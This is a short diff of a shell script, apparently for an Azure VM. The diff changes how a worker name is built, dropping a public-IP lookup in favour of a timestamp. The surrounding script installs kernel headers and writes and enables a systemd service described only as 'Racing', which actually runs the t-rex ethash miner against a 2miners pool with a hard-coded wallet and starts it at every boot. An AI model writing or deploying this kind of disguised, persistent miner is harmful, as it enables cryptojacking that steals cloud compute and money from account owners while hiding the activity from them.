@@ -1,6 +1,4 @@
-woker=$(date +'%d%m_%H_')
-myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
-woker+=$myip
+woker=$(date +'%d%m_%H%M%S')
 
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
@@ -12,3 +10,5 @@ sudo killall XXX
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azureuser/t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb545032e5c71bf9161292bb431328e5c210559b0 -p x -w 0000mlscript\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
+
+
